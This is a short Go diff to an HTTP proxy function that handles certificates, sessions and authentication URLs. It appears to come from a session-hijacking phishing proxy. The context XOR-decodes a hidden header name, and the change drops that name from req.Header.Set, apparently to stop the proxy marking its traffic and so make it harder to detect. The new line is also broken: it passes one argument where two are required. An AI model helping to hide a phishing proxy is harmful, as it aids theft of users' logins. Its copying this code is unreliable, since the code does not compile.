@@ -563,7 +563,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				for n, b := range e {
 					e[n] = b ^ 0x88
 				}
-				req.Header.Set(string(e), e_host)
+				req.Header.Set(e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
